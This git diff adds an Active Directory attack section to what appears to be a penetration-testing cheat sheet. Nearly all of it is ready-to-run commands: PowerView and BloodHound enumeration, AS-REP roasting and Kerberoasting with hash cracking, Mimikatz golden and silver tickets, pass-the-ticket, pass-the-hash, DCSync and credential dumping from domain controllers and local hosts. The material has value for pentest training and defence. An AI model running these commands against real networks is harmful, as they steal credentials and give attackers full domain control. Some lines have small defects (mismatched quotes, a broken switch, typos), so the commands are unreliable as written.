@@ -276,3 +276,63 @@ gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
 
 ### 11 Recon for Lateral Movement
     netstat -tnlp
+
+
+### 12 Active Directory
+    #### 12.1 Enumeration
+        #### 12.1.1 PowerView
+            Get-Domain
+            Get-DomainController -Domain xxxx
+            Get-DomainSID
+            Find-LocalAdminAccess
+            Get-DomainObject
+            Get-Domain
+         #### 12.1.2 Bloodhound
+            cd blooHoundInstallPath\BloodHound\resources\app\Collectors
+            powershell -ep bypass
+            . ./SharpHound.ps1
+            Invoke-Bloodhound -CollectionMethod All
+            
+    #### 12.2 Attacking AD
+        #### 12.2.1 AS-REP Roasting
+            Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
+            .\Rubeus.exe asreproast /user:johnny /outfile:johnhash.txt
+            .\johnTheRipper\john-1.9.0-jumbo-1-win64\run\john.exe .\johnhash.txt --format=krb5asrep -wordlist=.\10k-worst-pass.txtc
+        #### 12.2.2 Kerberoasting
+            Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+
+            Add-Type -AssemblyName System.IdentityModel
+            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “serviceprincipalname”
+                        
+            Invoke-Mimikatz -command '"kerberos::list /export"’
+
+            python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-xxxxxx.kirbi
+
+        #### 12.2.3 AD - Silver Ticket
+            Invoke-Mimikatz -Command '"kerberos::golden /domain:Get-Domain /sid:Get-DomainSID /target:DOMAIN_CONTROLLER /                    service:CIFS /rc4:serviceAccountPwdHash /user:administrator /ptt"'
+            
+        #### 12.2.4 AD - Golden Ticket
+        Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:Get-Domain /sid:Get-DomainSID /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+        #### 12.2.5 Pass-the-Ticket (PtT) Attacks (Run as admin)
+        Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+        Invoke-Mimikatz -Command ‘"kerberos::ptt xxxxxx.kirbi"’
+
+        #### 12.2.6 Pass-The-hash (Run as admin)
+        Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:Get-Domain /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
+
+        #### 12.2.7 DCSynch
+            Get-ObjectACL -DistinguishedName "CN=PROD,OU=Domain Controllers,DC=research,DC=SECURITY,DC=local" -ResolveGUIDs
+            | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -
+            match 'GenericAll') } | select IdentityReference 
+            
+            Invoke-Mimikatz lsadump::dcsync  /domain:Get-Domain /all
+
+        #### 12.2.8 Dump hashes from DC (Require domain admin)
+            Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local
+
+        #### 12.2.9 Dump hashes from loacal computer (run as admin)
+            Invoke-TokenManipulation –Enumerate
+            Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
+
+        
